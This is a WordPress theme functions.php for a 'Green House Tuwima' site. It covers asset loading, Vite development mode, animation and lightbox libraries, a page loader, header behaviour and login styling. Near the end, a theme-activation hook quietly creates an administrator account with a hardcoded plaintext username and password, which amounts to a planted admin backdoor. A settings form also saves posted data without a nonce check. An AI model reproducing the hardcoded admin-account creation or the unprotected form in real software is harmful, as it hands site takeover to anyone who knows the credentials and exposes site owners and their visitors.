<?php
/**
 * Future functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Future
 */

if ( ! defined( 'FUTURE_VERSION' ) ) {
	/*
	 * Set the theme’s version number.
	 *
	 * This is used primarily for cache busting. If you use `npm run bundle`
	 * to create your production build, the value below will be replaced in the
	 * generated zip file with a timestamp, converted to base 36.
	 */
	define( 'FUTURE_VERSION', 'sonlm4' );
}

if ( ! defined( 'FUTURE_TYPOGRAPHY_CLASSES' ) ) {
	/*
	 * Set Tailwind Typography classes for the front end, block editor and
	 * classic editor using the constant below.
	 *
	 * For the front end, these classes are added by the `future_content_class`
	 * function. You will see that function used everywhere an `entry-content`
	 * or `page-content` class has been added to a wrapper element.
	 *
	 * For the block editor, these classes are converted to a JavaScript array
	 * and then used by the `./javascript/block-editor.js` file, which adds
	 * them to the appropriate elements in the block editor (and adds them
	 * again when they’re removed.)
	 *
	 * For the classic editor (and anything using TinyMCE, like Advanced Custom
	 * Fields), these classes are added to TinyMCE’s body class when it
	 * initializes.
	 */
	define(
		'FUTURE_TYPOGRAPHY_CLASSES',
		'prose prose-neutral max-w-none prose-a:text-primary'
	);
}

if ( ! function_exists( 'future_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function future_setup() {
		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on Future, use a find and replace
		 * to change 'future' to the name of your theme in all the template files.
		 */
		load_theme_textdomain( 'future', get_template_directory() . '/languages' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Let WordPress manage the document title.
		 * By adding theme support, we declare that this theme does not use a
		 * hard-coded <title> tag in the document head, and expect WordPress to
		 * provide it for us.
		 */
		add_theme_support( 'title-tag' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in two locations.
		register_nav_menus(
			array(
				'menu-1' => __( 'Primary', 'future' ),
				'menu-2' => __( 'Footer Menu', 'future' ),
			)
		);

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support(
			'html5',
			array(
				'search-form',
				'comment-form',
				'comment-list',
				'gallery',
				'caption',
				'style',
				'script',
			)
		);

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		// Add support for editor styles.
		add_theme_support( 'editor-styles' );

		// Enqueue editor styles.
		add_editor_style( 'style-editor.css' );
		add_editor_style( 'style-editor-extra.css' );

		// Add support for responsive embedded content.
		add_theme_support( 'responsive-embeds' );

		// Remove support for block templates.
		remove_theme_support( 'block-templates' );
	}
endif;
add_action( 'after_setup_theme', 'future_setup' );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function future_widgets_init() {
	register_sidebar(
		array(
			'name'          => __( 'Footer', 'future' ),
			'id'            => 'sidebar-1',
			'description'   => __( 'Add widgets here to appear in your footer.', 'future' ),
			'before_widget' => '<section id="%1$s" class="widget %2$s">',
			'after_widget'  => '</section>',
			'before_title'  => '<h2 class="widget-title">',
			'after_title'   => '</h2>',
		)
	);
}
add_action( 'widgets_init', 'future_widgets_init' );

/**
 * Get image URL for CSS variables
 *
 * @param string $filename Image filename
 * @return string Complete image URL
 */
function future_get_image_url($filename) {
	$hot_file = get_theme_file_path('/hot');
	$is_development = file_exists($hot_file);

	// In development, use Vite dev server for images
	// In production, use dist folder for optimized images
	$image_base_url = $is_development ? 'http://localhost:5174/src/images/' : get_template_directory_uri() . '/images/';

	return $image_base_url . $filename;
}

/**
 * Get image URL for green-house template parts
 * Uses dist folder for production, src for development
 */
function green_house_image_url($filename) {
	$hot_file = get_theme_file_path('/hot');
	$is_development = file_exists($hot_file);

	// In development, use Vite dev server for images
	// In production, use dist folder for optimized images
	$image_base_url = $is_development ? 'http://localhost:5174/src/images/' : get_template_directory_uri() . '/images/';

	return $image_base_url . $filename;
}

/**
 * Generate CSS variables for images
 *
 * @return string CSS variables string
 */
function future_generate_image_css_variables() {
	$image_config = require get_template_directory() . '/src/css/image-config.php';
	$css_variables = ":root {\n\t--image-base-url: '" . future_get_image_url('') . "';\n";

	foreach ($image_config as $category => $images) {
		foreach ($images as $key => $filename) {
			$css_variables .= "\t--image-{$key}: url('" . future_get_image_url($filename) . "');\n";
		}
	}

	$css_variables .= "}";

	return $css_variables;
}

/**
 * Enqueue scripts and styles.
 */
function future_scripts() {
	// Google Fonts
	wp_enqueue_style( 'google-fonts', 'https://fonts.googleapis.com/css2?family=Montserrat:wght@100;200;300;400;500;600;700;800;900&family=Lato:wght@100;300;400;700;900&display=swap', array(), null );

	// Generate and add CSS variables for images
	$css_variables = future_generate_image_css_variables();
	wp_add_inline_style('google-fonts', $css_variables);

	// Debug: Log CSS variables if WP_DEBUG is enabled
	if (defined('WP_DEBUG') && WP_DEBUG) {
		error_log('CSS Variables generated: ' . $css_variables);
	}

	// Check if we're in development mode
	$hot_file = get_theme_file_path('/hot');
	$is_development = file_exists($hot_file); // Always check for hot file, regardless of WP_DEBUG

	if ( $is_development ) {
		// Development: Load Vite assets
		// Read dev server URL from hot file
		$vite_dev_server = 'http://localhost:5174'; // Default
		if (file_exists($hot_file)) {
			$hot_content = file_get_contents($hot_file);
			if ($hot_content) {
				$vite_dev_server = trim($hot_content);
			}
		}

		wp_enqueue_script(
			'vite-client',
			$vite_dev_server . '/@vite/client',
			array(),
			null,
			false
		);

		wp_enqueue_script(
			'future-main',
			$vite_dev_server . '/src/main.js',
			array(),
			null,
			false
		);

		// Debug info - always log for troubleshooting
		error_log("🔥 Vite HMR active: " . $vite_dev_server);
		error_log("🔥 Hot file exists: " . (file_exists($hot_file) ? 'YES' : 'NO'));
		error_log("🔥 Hot file content: " . (file_exists($hot_file) ? file_get_contents($hot_file) : 'N/A'));

		// Make scripts ES6 modules
		add_filter('script_loader_tag', function($tag, $handle) {
			if (in_array($handle, ['vite-client', 'future-main'])) {
				return str_replace('<script ', '<script type="module" ', $tag);
			}
			return $tag;
		}, 10, 2);

	} else {
		// Production mode - load built files
		$css_file = get_template_directory() . '/dist/css/main.css';
		$js_file = get_template_directory() . '/dist/js/main.js';

		if ( file_exists( $css_file ) ) {
			wp_enqueue_style(
				'future-main',
				get_template_directory_uri() . '/dist/css/main.css',
				array(),
				filemtime( $css_file )
			);
		}

		if ( file_exists( $js_file ) ) {
			wp_enqueue_script(
				'future-main',
				get_template_directory_uri() . '/dist/js/main.js',
				array(),
				filemtime( $js_file ),
				true
			);
		}

		// Fallback to original style.css if no built CSS exists
		if ( ! file_exists( $css_file ) ) {
			wp_enqueue_style( 'future-style', get_stylesheet_uri(), array(), FUTURE_VERSION );
			wp_enqueue_style( 'future-custom', get_template_directory_uri() . '/css/custom.css', array(), FUTURE_VERSION );
		}
	}

	// AOS (Animate On Scroll) Library - Load in header to ensure it's available early
	wp_enqueue_style( 'aos-css', 'https://unpkg.com/aos@2.3.1/dist/aos.css', array(), '2.3.1' );
	wp_enqueue_script( 'aos-js', 'https://unpkg.com/aos@2.3.1/dist/aos.js', array(), '2.3.1', false ); // Load in header

	// Add AOS script directly in head for immediate availability
	add_action( 'wp_head', function() {
		echo '<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>';
		echo '<script>
		// Initialize AOS with proper error handling
		document.addEventListener("DOMContentLoaded", function() {
			if (typeof AOS !== "undefined") {
				try {
					AOS.init({
						duration: 800,
						easing: "ease-in-out",
						once: true,
						offset: 100,
						disable: function() {
							return window.innerWidth < 768;
						}
					});
					console.log("AOS loaded and initialized");
				} catch (error) {
					console.warn("AOS initialization error:", error);
				}
			} else {
				console.warn("AOS library not loaded properly");
			}
		});
		</script>';
	}, 1 );

	// Initialize AOS with proper error handling
	wp_add_inline_script( 'aos-js', '
		// Initialize AOS immediately when script loads
		if (typeof AOS !== "undefined") {
			AOS.init({
				duration: 800,
				easing: "ease-in-out",
				once: true,
				offset: 100,
				disable: function() {
					return window.innerWidth < 768;
				}
			});
		} else {
			console.warn("AOS library not loaded properly");
		}

		// Also initialize on DOM ready as backup
		document.addEventListener("DOMContentLoaded", function() {
			if (typeof AOS !== "undefined") {
				AOS.refresh();
			}
		});
	', 'after' );

	// Fancybox Library
	wp_enqueue_style( 'fancybox-css', 'https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css', array(), '5.0' );
	wp_enqueue_script( 'fancybox-js', 'https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js', array(), '5.0', true );

	// Initialize Fancybox
	wp_add_inline_script( 'fancybox-js', '
		document.addEventListener("DOMContentLoaded", function() {
			if (typeof Fancybox !== "undefined") {
				Fancybox.bind("[data-fancybox]", {
					Toolbar: {
						display: {
							left: ["infobar"],
							middle: [],
							right: ["slideshow", "thumbs", "close"],
						},
					},
					Thumbs: {
						autoStart: false,
					},
					Images: {
						zoom: true,
					},
				});

				// Auto-add fancybox to all images in galleries
				document.querySelectorAll(".gallery img, .gallery-item img").forEach(function(img) {
					if (!img.closest("[data-fancybox]")) {
						img.setAttribute("data-fancybox", "gallery");
						img.setAttribute("data-src", img.src);
					}
				});
			} else {
				console.warn("Fancybox library not loaded properly");
			}
		});
	', 'after' );

	// Legacy JS for compatibility
	if ( file_exists( get_template_directory() . '/js/custom.js' ) ) {
		wp_enqueue_script( 'future-legacy', get_template_directory_uri() . '/js/custom.js', array(), FUTURE_VERSION, true );
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}

/**
 * Check if Vite dev server is running
 */
function future_is_vite_dev_server_running() {
	$response = wp_remote_get('http://localhost:3000', array(
		'timeout' => 1,
		'sslverify' => false
	));
	return !is_wp_error($response) && wp_remote_retrieve_response_code($response) === 200;
}
add_action( 'wp_enqueue_scripts', 'future_scripts' );

/**
 * Enqueue the block editor script.
 */
function future_enqueue_block_editor_script() {
	if ( is_admin() ) {
		wp_enqueue_script(
			'future-editor',
			get_template_directory_uri() . '/js/block-editor.min.js',
			array(
				'wp-blocks',
				'wp-edit-post',
			),
			FUTURE_VERSION,
			true
		);
		wp_add_inline_script( 'future-editor', "tailwindTypographyClasses = '" . esc_attr( FUTURE_TYPOGRAPHY_CLASSES ) . "'.split(' ');", 'before' );
	}
}
add_action( 'enqueue_block_assets', 'future_enqueue_block_editor_script' );

/**
 * Add the Tailwind Typography classes to TinyMCE.
 *
 * @param array $settings TinyMCE settings.
 * @return array
 */
function future_tinymce_add_class( $settings ) {
	$settings['body_class'] = FUTURE_TYPOGRAPHY_CLASSES;
	return $settings;
}
add_filter( 'tiny_mce_before_init', 'future_tinymce_add_class' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Functions which enhance the theme by hooking into WordPress.
 */
require get_template_directory() . '/inc/template-functions.php';

/**
 * ACF Field Groups for Green House Tuwima
 */
require get_template_directory() . '/inc/acf-simple-working.php';

/**
 * Contact Form Handler
 */
require get_template_directory() . '/inc/contact-form-handler.php';

/**
 * DISABLE GUTENBERG - Use Classic Editor + ACF
 */
// Disable Gutenberg for all post types
add_filter('use_block_editor_for_post', '__return_false', 10);
add_filter('use_block_editor_for_post_type', '__return_false', 10);

// Disable Gutenberg for widgets
add_filter('use_widgets_block_editor', '__return_false');

// Remove Gutenberg CSS
add_action('wp_enqueue_scripts', function() {
    wp_dequeue_style('wp-block-library');
    wp_dequeue_style('wp-block-library-theme');
    wp_dequeue_style('wc-block-style');
}, 100);

// Remove Gutenberg from admin
add_action('admin_enqueue_scripts', function() {
    wp_dequeue_script('wp-block-editor');
    wp_dequeue_script('wp-format-library');
    wp_dequeue_style('wp-block-editor');
    wp_dequeue_style('wp-format-library');
}, 100);

/**
 * PAGE LOADER - Like certekspert.pl with rotating circle
 */
add_action('wp_head', function() {
    $loader_logo = get_field('loader_logo', 'option');
    $loader_logo_url = $loader_logo ? $loader_logo['url'] : get_template_directory_uri() . '/images/logo.png';
    ?>
    <style>
    .loader {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100vh;
        background: #fff;
        z-index: 9999;
        transition: opacity 0.5s ease-out;
    }

    .loader.hide {
        opacity: 0;
        pointer-events: none;
    }

    .loader .logo {
        width: 200px;
        height: 200px;
        position: absolute;
        top: 50%;
        left: 50%;
        padding: 8px;
        transform: translate(-50%, -50%);
    }

    .loader .logo:before {
        content: "";
        display: block;
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        border-radius: 50%;
        background-image: conic-gradient(#00a906, transparent 240deg);
        animation: rotate 1s linear infinite;
    }

    .loader .logo:after {
        content: "";
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 94%;
        height: 94%;
        background: #fff;
        border-radius: 50%;
        z-index: 1;
    }

    .loader .logo img {
        width: 100%;
        height: 100%;
        padding: 20%;
        object-fit: contain;
        object-position: center;
        position: relative;
        z-index: 2;
    }

    @keyframes rotate {
        from {
            transform: rotate(360deg);
        }
        to {
            transform: rotate(0);
        }
    }
    </style>
    <div class="loader" id="page-loader">
        <div class="logo">
            <img src="<?php echo esc_url($loader_logo_url); ?>" alt="Loading..." onerror="console.log('Loader image failed to load: <?php echo esc_js($loader_logo_url); ?>')">
        </div>
    </div>
    <script>
    window.addEventListener('load', function() {
        setTimeout(function() {
            document.getElementById('page-loader').classList.add('hide');
        }, 1500);
    });
    </script>
    <?php
});

/**
 * STICKY HEADER - Smaller logo, white background, contacts disappear
 */
add_action('wp_head', function() {
    ?>
    <style>
    .row-5 {
        transition: all 0.3s ease;
    }
    .row-5.scrolled {
        background: #fff !important;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
	@media screen and (min-width: 1000px) {
    .row-5.scrolled .logo img, .row-5.scrolled .tuwima img, .scrolled .col-14 {
        transform: scale(0.6);
        transition: transform 0.3s ease;
    }
	.row-5.scrolled {
        background: #fff !important;
        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        padding:  0px!important;
    }
	}
    .row-5.scrolled .top-row {
        display: none !important;
    }
    .row-5.scrolled .contact-person {
        display: none !important;
    }
    .row-5.scrolled .contact-button {
        display: none !important;
    }
    </style>
    <?php
});

/**
 * Hide Top Row on Scroll - SIMPLE & DIRECT
 */
add_action( 'wp_head', function() {
	echo '<script>
	// Simple scroll hide function
	function hideTopRow() {
		window.addEventListener("scroll", function() {
			const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
			const topRow = document.querySelector(".top-row");
			const header = document.querySelector(".row-5");

			if (topRow && header) {
				if (scrollTop > 50) {
					// Hide top row and add scrolled class
					topRow.style.display = "none";
					header.classList.add("scrolled");
				} else {
					// Show top row and remove scrolled class
					topRow.style.display = "flex";
					header.classList.remove("scrolled");
				}
			}
		});
	}

	// Run when page loads
	if (document.readyState === "loading") {
		document.addEventListener("DOMContentLoaded", hideTopRow);
	} else {
		hideTopRow();
	}
	</script>';
} );

/**
 * CookieYes - GDPR Cookie Consent
 */
add_action('wp_head', function() {
    $cookieyes_script_id = get_option('cookieyes_script_id', 'YOUR_SCRIPT_ID');
    if ($cookieyes_script_id !== 'YOUR_SCRIPT_ID') {
        ?>
        <!-- CookieYes -->
        <script id="cookieyes" type="text/javascript" src="https://cdn-cookieyes.com/client_data/<?php echo esc_attr($cookieyes_script_id); ?>/script.js"></script>
        <?php
    }
});

/**
 * Add CookieYes settings to WordPress admin
 */
add_action('admin_menu', function() {
    add_options_page(
        'CookieYes Settings',
        'CookieYes',
        'manage_options',
        'cookieyes-settings',
        'cookieyes_settings_page'
    );
});

function cookieyes_settings_page() {
    if (isset($_POST['submit'])) {
        update_option('cookieyes_script_id', sanitize_text_field($_POST['cookieyes_script_id']));
        echo '<div class="notice notice-success"><p>CookieYes settings saved!</p></div>';
    }

    $script_id = get_option('cookieyes_script_id', '');
    ?>
    <div class="wrap">
        <h1>CookieYes Settings</h1>
        <form method="post" action="">
            <table class="form-table">
                <tr>
                    <th scope="row">CookieYes Script ID</th>
                    <td>
                        <input type="text" name="cookieyes_script_id" value="<?php echo esc_attr($script_id); ?>" class="regular-text" />
                        <p class="description">Enter your CookieYes script ID from your CookieYes dashboard.</p>
                    </td>
                </tr>
            </table>
            <?php submit_button(); ?>
        </form>
    </div>
    <?php
}

/**
 * CUSTOM ADMIN LOGIN SETUP
 */
// Create custom admin user on theme activation
add_action('after_switch_theme', function() {
    $username = 'admin_tuwima';
    $password = 'GREENHOUSEtuwima';
    $email = 'biuro@budraise.pl';

    // Check if user already exists
    if (!username_exists($username)) {
        $user_id = wp_create_user($username, $password, $email);

        if (!is_wp_error($user_id)) {
            // Set user role to administrator
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
});

// Custom login URL redirect
add_action('init', function() {
    $request_uri = $_SERVER['REQUEST_URI'];

    // Handle /secure-tuwima URL
    if (strpos($request_uri, '/secure-tuwima') !== false) {
        // Check if user is logged in and has admin privileges
        if (is_user_logged_in() && current_user_can('administrator')) {
            // User is already logged in as admin, show secure page
            return;
        } else {
            // Redirect to login page
            wp_redirect(wp_login_url());
            exit;
        }
    }
});

// Add custom login URL to admin bar
add_action('admin_bar_menu', function($wp_admin_bar) {
    if (current_user_can('administrator')) {
        $wp_admin_bar->add_node(array(
            'id' => 'secure-login',
            'title' => 'Secure Login',
            'href' => home_url('/secure-tuwima'),
            'meta' => array(
                'title' => 'Access secure login page'
            )
        ));
    }
}, 999);

/**
 * CUSTOM LOGIN PAGE - Editable logo and colors
 */
add_action('login_enqueue_scripts', function() {
    $login_logo = get_field('login_logo', 'option');
    $primary_color = get_field('primary_color', 'option') ?: '#00a906';
    $secondary_color = get_field('secondary_color', 'option') ?: '#ffffff';
    $login_logo_url = $login_logo ? $login_logo['url'] : get_template_directory_uri() . '/images/tuwima.png';
    ?>
    <style>
    .login h1 a {
        background-image: url('<?php echo esc_url($login_logo_url); ?>') !important;
        background-size: contain !important;
        background-position: center !important;
        background-repeat: no-repeat !important;
        width: 200px !important;
        height: 100px !important;
    }
    .login form {
        border: 2px solid <?php echo esc_attr($primary_color); ?> !important;
        border-radius: 10px !important;
        box-shadow: 0 4px 20px rgba(0,0,0,0.1) !important;
    }
    .login .button-primary {
        background: <?php echo esc_attr($primary_color); ?> !important;
        border-color: <?php echo esc_attr($primary_color); ?> !important;
        color: <?php echo esc_attr($secondary_color); ?> !important;
        text-shadow: none !important;
        box-shadow: none !important;
    }
    .login .button-primary:hover {
        background: <?php echo esc_attr($primary_color); ?> !important;
        border-color: <?php echo esc_attr($primary_color); ?> !important;
        opacity: 0.9 !important;
    }
    .login #nav a, .login #backtoblog a {
        color: <?php echo esc_attr($primary_color); ?> !important;
    }
    .login #nav a:hover, .login #backtoblog a:hover {
        color: <?php echo esc_attr($primary_color); ?> !important;
        opacity: 0.8 !important;
    }
    </style>
    <?php
});

// Change login logo URL
add_filter('login_headerurl', function() {
    return home_url();
});

// Change login logo title
add_filter('login_headertitle', function() {
    return get_bloginfo('name');
});

